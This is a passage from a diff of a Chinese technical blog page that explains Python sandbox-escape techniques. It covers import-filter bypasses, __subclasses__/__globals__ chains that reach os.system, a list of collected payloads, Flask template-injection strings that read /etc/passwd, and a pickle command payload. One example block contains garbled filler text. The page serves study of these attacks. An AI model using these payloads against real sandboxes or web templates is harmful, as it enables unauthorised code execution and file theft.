&apos;doctest&apos;, &apos;posix&apos;, &apos;urllib&apos;, &apos;_sha512&apos;, &apos;dummy_threading&apos;, &apos;posixpath&apos;, &apos;urllib3&apos;, &apos;_signal&apos;, &apos;email&apos;, &apos;pprint&apos;, &apos;usbcreator&apos;, &apos;_sitebuiltins&apos;, &apos;encodings&apos;, &apos;problem_report&apos;, &apos;uu&apos;, &apos;_socket&apos;, &apos;enum&apos;, &apos;profile&apos;, &apos;uuid&apos;, &apos;_sqlite3&apos;, &apos;errno&apos;, &apos;pstats&apos;, &apos;venv&apos;, &apos;_sre&apos;, &apos;faulthandler&apos;, &apos;pty&apos;, &apos;wadllib&apos;, &apos;_ssl&apos;, &apos;fcntl&apos;, &apos;ptyprocess&apos;, &apos;warnings&apos;, &apos;_stat&apos;, &apos;filecmp&apos;, &apos;pwd&apos;, &apos;wave&apos;, &apos;_string&apos;, &apos;fileinput&apos;, &apos;py_compile&apos;, &apos;weakref&apos;, &apos;_strptime&apos;, &apos;fnmatch&apos;, &apos;pyatspi&apos;, &apos;webbrowser&apos;, &apos;_struct&apos;, &apos;formatter&apos;, &apos;pyclbr&apos;, &apos;wsgiref&apos;, &apos;_symtable&apos;, &apos;fractions&apos;, &apos;pydoc&apos;, &apos;xdg&apos;, &apos;_sysconfigdata_m_linux_x86_64-linux-gnu&apos;, &apos;ftplib&apos;, &apos;pydoc_data&apos;, &apos;xdrlib&apos;, &apos;_testbuffer&apos;, &apos;functools&apos;, &apos;pyexpat&apos;, &apos;xkit&apos;, &apos;_testcapi&apos;, &apos;gc&apos;, &apos;pygtkcompat&apos;, &apos;xml&apos;, &apos;_testimportmultiple&apos;, &apos;genericpath&apos;, &apos;pymacaroons&apos;, &apos;xmlrpc&apos;, &apos;_testmultiphase&apos;, &apos;getopt&apos;, &apos;pyrfc3339&apos;, &apos;xxlimited&apos;, &apos;_thread&apos;, &apos;getpass&apos;, &apos;pytz&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;gettext&apos;, &apos;queue&apos;, &apos;yaml&apos;, &apos;_tracemalloc&apos;, &apos;gi&apos;, &apos;quopri&apos;, &apos;zipapp&apos;, &apos;_warnings&apos;, &apos;glob&apos;, &apos;random&apos;, &apos;zipfile&apos;, &apos;_weakref&apos;, &apos;grp&apos;, &apos;re&apos;, &apos;zipimport&apos;, &apos;_weakrefset&apos;, &apos;gtweak&apos;, &apos;readline&apos;, &apos;zlib&apos;, &apos;_yaml&apos;, &apos;gzip&apos;, &apos;reportlab&apos;, &apos;zope&apos;, &apos;abc&apos;, &apos;hashlib&apos;, &apos;reprlib&apos;, &apos;aifc&apos;, &apos;heapq&apos;
+]
+
+methods = [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;]
+
+results = {}
+for module in all_modules_3:
+    results[module] = {
+        &apos;flag&apos;: 0,
+        &apos;result&apos;: {}
+    }
+
+    try:
+        m = __import__(module)
+        attrs = dir(m)
+        for method in methods:
+            if method in attrs:
+                result = &apos;yes&apos;
+                results[module][&apos;flag&apos;] = 1
+            else:
+                result = &apos;no&apos;
+
+            results[module][&apos;result&apos;][method] = result
+
+    except Exception as e:
+        print(e)
+
+for result in results:
+    if results[result][&apos;flag&apos;]:
+        print(&apos;[+]&apos; + result)
+        for r in results[result][&apos;result&apos;]:
+            print(&apos;  [-]&apos; + r + &apos;: &apos; + results[result][&apos;result&apos;][r])</code></pre><p>从结果可以看到有相当大一部分模块都导入了“危险”的函数。只要我们可以 <code>import</code> 那么存在这些模块的环境就是危险的。</p>
+<h3 id="如果我们没办法-import-呢？"><a href="#如果我们没办法-import-呢？" class="headerlink" title="如果我们没办法 import 呢？"></a>如果我们没办法 import 呢？</h3><p>如果只是简单的禁用 <code>import os</code> 我们可以加空格绕过 <code>import   os</code> .</p>
+<p>如果多个空格也过滤了我们还可以 <code>__import__(&#39;os&#39;)</code>.</p>
+<p>如果过滤 os 我们还可以 <code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code>。</p>
+<p>如果这也不行还有 <code>importlib:importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code>.</p>
+<p>联想到我们上面说的 <code>__builtin__/__builtins__</code>,一些危险内建函数都可以直接用，如果这些函数都被 del 掉我们可以 <code>reload(__builtin__)</code> 来重载一个完整的 <code>__builtin__</code>.</p>
+<p>reload 也是内建函数，如果这也没了呢？ </p>
+<pre><code>import imp
+imp.reload(__builtin__)</code></pre><p>也可以引入。</p>
+<p>如果 <code>sys.modules[&#39;os&#39;]=None</code> 从根源删除呢？</p>
+<p>实际上联系到 import 的原理</p>
+<blockquote>
+<p>如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中</p>
+</blockquote>
+<p>如果 <code>sys</code> 可以用的话可以先确认一下路径</p>
+<pre><code>import sys
+print(sys.path)</code></pre><p>本质上是执行一遍导入的库，这个过程可以用 <code>execfile</code> 来代替</p>
+<pre><code>execfile(&apos;/usr/lib/python2.7/os.py&apos;)
+system(&apos;ls&apos;)</code></pre><p>3.x 中删除了 execfile ，不过可以这样：</p>
+<pre><code>with open(&apos;/usr/lib/python3.6/os.py&apos;,&apos;r&apos;) as f:
+    exec(f.read())
+system(&apos;ls&apos;)</code></pre><p>还有一种方法：当我们使用 del sys.modules[‘os’] 时是不起作用的，因为在import 时会在检测到不存在 os 时重载一次，也就是说我们可以</p>
+<pre><code>sys.modules[&apos;os&apos;] = &apos;not allowed&apos; # oj 为你加的
+
+del sys.modules[&apos;os&apos;]
+import os
+os.system(&apos;ls&apos;)</code></pre><h3 id="其他一些小技巧"><a href="#其他一些小技巧" class="headerlink" title="其他一些小技巧"></a>其他一些小技巧</h3><ol>
+<li><p>过滤掉整个匹配语句我们可以使用变量替换的方式</p>
+<p> a = open<br> print(a(“d:/test.txt”).read())<br>  /etc/djmasl: das jdoas info<br> /<file system> <mount> <type><br> proc   /proc  0 /0 /dev/had2 / errors=dk,aspd 1…</type></mount></file></p>
+</li>
+<li><p>函数后面加空格、换行都能执行</p>
+</li>
+<li><p>如果程序中调用了第三方的库，恰好这个库有执行命令的函数</p>
+<p> from numpy.distutils.exec_command import _exec_command as system</p>
+<p> system(“ls /“)</p>
+</li>
+<li><p>使用别名</p>
+<p> import os as o</p>
+</li>
+<li><p>字符串拼接</p>
+<p> “l”+”s”</p>
+<p> “func_global”+”s”</p>
+</li>
+<li><p>字符串编码或者其他操作</p>
+<p> ‘X19pbXBvcnRfXw==’.decode(‘base64’) //<strong>import</strong></p>
+<p> <strong>import</strong>(‘so’[::-1]).system(‘ls’)</p>
+<p> eval(‘)”imaohw”(metsys.)”so”(<strong>tropmi</strong>‘[::-1])</p>
+<p> exec(‘)”imaohw”(metsys.so ;so tropmi’[::-1])</p>
+</li>
+</ol>
+<h2 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a>通过继承关系逃逸</h2><p>通过 Python 的继承关也就是说我们想利用的模块被杀了之后我们想办法构造一条到基类的链然后再自顶向下重新找到一个可行的路来使用目标模块。 </p>
+<p>python 类中有个属性叫 <strong>mro</strong> ,是个元组记录了继承关系。</p>
+<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__
+(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</code></pre><p>通过文章最开始的介绍我们也可以通过多次使用 <code>__base__</code> 来找到基类 <code>object</code></p>
+<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__base__
+&lt;type &apos;object&apos;&gt;</code></pre><p>然后从基类向下回溯，使用 <code>__subclasses__</code></p>
+<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__
+(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)
+&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]
+&lt;type &apos;object&apos;&gt;
+&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__
+&lt;built-in method __subclasses__ of type object at 0x0000000061AE85E0&gt;
+&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()
+[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;sys.getwindowsversion&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;nt.stat_result&apos;&gt;, &lt;type &apos;nt.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;MultibyteCodec&apos;&gt;, &lt;type &apos;MultibyteIncrementalEncoder&apos;&gt;, &lt;type &apos;MultibyteIncrementalDecoder&apos;&gt;, &lt;type &apos;MultibyteStreamReader&apos;&gt;, &lt;type &apos;MultibyteStreamWriter&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;Struct&apos;&gt;]</code></pre><p>我们发现结果太多了，网上找到 bendawang 师傅的脚本来循环找一下</p>
+<pre><code>#!/usr/bin/env python
+# encoding: utf-8
+
+cnt=0
+for item in [].__class__.__base__.__subclasses__():
+    try:
+        if &apos;os&apos; in item.__init__.__globals__:
+            print cnt,item
+        cnt+=1
+    except:
+        print &quot;error&quot;,cnt,item
+        cnt+=1
+        continue</code></pre><p>利用这个来找到 <code>os</code> 模块的入口</p>
+<pre><code>#!/usr/bin/env python
+# encoding: utf-8
+
+cnt=0
+for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():
+    try:
+        cnt2=0
+        for i in item.__init__.__globals__:
+            if &apos;eval&apos; in item.__init__.__globals__[i]:
+                print cnt,item,cnt2,i
+            cnt2+=1
+        cnt+=1
+    except:
+        print &quot;error&quot;,cnt,item
+        cnt+=1
+        continue</code></pre><p>这个相当于更深入一层查找</p>
+<p>存在的子模块可以通过 .index() 来进行查询，如果存在返回索引</p>
+<pre><code>&apos;&apos;.__class__.__mro__[2].__subclasses__().index(file)</code></pre><p>2.x 版本中有一个 warnings </p>
+<pre><code>&gt;&gt;&gt; import warnings
+&gt;&gt;&gt; warnings.os
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+AttributeError: &apos;module&apos; object has no attribute &apos;os&apos;
+&gt;&gt;&gt; warnings.linecache
+&lt;module &apos;linecache&apos; from &apos;F:\python2.7\lib\linecache.pyc&apos;&gt;
+&gt;&gt;&gt; warnings.linecache.os
+&lt;module &apos;os&apos; from &apos;F:\python2.7\lib\os.pyc&apos;&gt;</code></pre><p>我们可以</p>
+<pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;whoami&apos;)</code></pre><p>简单的给基类的所有模块编号</p>
+<pre><code>for i in enumerate(&apos;&apos;.__class__.__mro__[-1].__subclasses__()): print i</code></pre><p>如何便捷的找到我们想要的入口</p>
+<pre><code>[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &apos;catch_warnings&apos;]</code></pre><h3 id="大佬们的payload"><a href="#大佬们的payload" class="headerlink" title="大佬们的payload"></a>大佬们的payload</h3><ol>
+<li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;) //3.x</code></li>
+<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</code></li>
+<li><code>[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</code></li>
+<li><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>
+<li><code>[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>
+<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>
+<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>
+<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</code></li>
+<li><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></li>
+</ol>
+<h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>如果碰到过滤 <code>[ ]</code> ，我们可以将 <code>[]</code> 的功能用 <code>pop</code> 、 <code>__getitem__</code>代替（实际上 <code>a[0]</code> 在内部就是调用了 <code>a.__getitem__(0)</code> ），<code>pop()</code> 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</p>
+<pre><code>&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&apos;linecache&apos;).os.popen(&apos;whoami&apos;).read()</code></pre><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>requests.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 作为变量名将后面的路径传进来，来绕过引号</p>
+<pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd</code></pre><h3 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h3><p>同样利用  requests.args 属性</p>
+<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>除了编码，我们还可以通过字符串拼接</p>
+<p><code>__getattribute__</code> 使用实例访问属性时,调用该方法</p>
+<pre><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}</code></pre><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ol>
+<li>func_globals</li>
+</ol>
+<p>返回包含函数全局变量的字典的引用-定义函数的模块的全局命名空间</p>
+<ol start="2">
+<li><strong>getattribute</strong></li>
+</ol>
+<p>被调用无条件地实现类的实例的属性访问</p>
+<pre><code>object. getattribute(self, name)
+1）self 必需的。类的实例，在调用时自动传递。
+2）name 必需的。属性的名称。</code></pre><ol start="3">
+<li><strong>subclasses</strong>()[]</li>
+</ol>
+<p>获取子类</p>
+<ol start="4">
+<li>getattr</li>
+</ol>
+<p>返回对象的命名属性的值</p>
+<pre><code>getattr(object,name) &lt;=&gt; object.name
+&gt;&gt;&gt; class A():
+...     bar =1
+...
+
+&gt;&gt;&gt; a = A()
+
+&gt;&gt;&gt; getattr(a,&apos;bar&apos;)
+1</code></pre><ol start="5">
+<li><strong>name</strong></li>
+</ol>
+<p>使用 sys.modules[<strong>name</strong>] 获得模块的引用</p>
+<ol start="6">
+<li><p>timeit</p>
+<p> timeit(命令，number=1)</p>
+<p> import timeit<br> timeit.timeit(“<strong>import</strong>(‘os’).system(‘dir’)”,number=1) </p>
+</li>
+<li><p>platform</p>
+</li>
+</ol>
+<p>模块和平台有关，主要是返回平台的一些信息</p>
+<pre><code>print platform.popen(&apos;dir&apos;,mode=&apos;r&apos;,bufsize= -1).read()</code></pre><ol start="8">
+<li><strong>globals</strong></li>
+</ol>
+<p>常与 <code>__init__</code> 配合使用，<code>__init__</code> 一般跟在类的后面。相当于实例化这个类</p>
+<pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</code></pre><ol start="9">
+<li><strong>call</strong></li>
+</ol>
+<p>使实例能够像函数一样被调用 <code>x.call() &lt;=&gt; x()</code></p>
+<ol start="10">
+<li>pickle</li>
+</ol>
+<p>将对象储存在字符串对象中，实现对象的持久化</p>
+<p>序列化：</p>
+<pre><code>import pickle
+test=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])
+p=pickle.dumps(test)</code></pre><p>反序列化：</p>
+<pre><code>n=pickle.loads(p)</code></pre><p>我们可以加载命令：</p>
+<pre><code>pickle.loads(b&quot;cos\nsystem\n(S&apos;ls&apos;\ntR.&quot;)</code></pre><ol start="11">
+<li><p>os/subprocess/commands</p>
+<p>os.system(‘ipconfig’)<br>os.popen(‘ipconfig’)<br>commands.getoutput(‘ipconfig’)<br>commands.getstatusoutput(‘ifconfig’)<br>subrocess.call([‘ipconfig’],shell=true)</p>
+</li>
+<li><p>eval/exec/execfile</p>
+<p>eval() 执行 python 表达式执行的结果</p>
+<p>exec() 动态执行 python 代码，可以执行复杂的 python 代码，eval 只能计算一个表达式</p>
+<p>execfile() 执行一个文件的内容，文件是将被解析为 python 序列的类似模块的文件</p>
+</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a href="https://www.cnblogs.com/hester/p/4694499.html" target="_blank" rel="noopener">https://www.cnblogs.com/hester/p/4694499.html</a><br><a href="https://www.restran.net/2015/10/22/how-python-code-run/" target="_blank" rel="noopener">https://www.restran.net/2015/10/22/how-python-code-run/</a><br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/203208.html</a><br><a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands</a><br><a href="https://www.zhihu.com/question/38791962?sort=created" target="_blank" rel="noopener">https://www.zhihu.com/question/38791962?sort=created</a></p>
+</blockquote>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
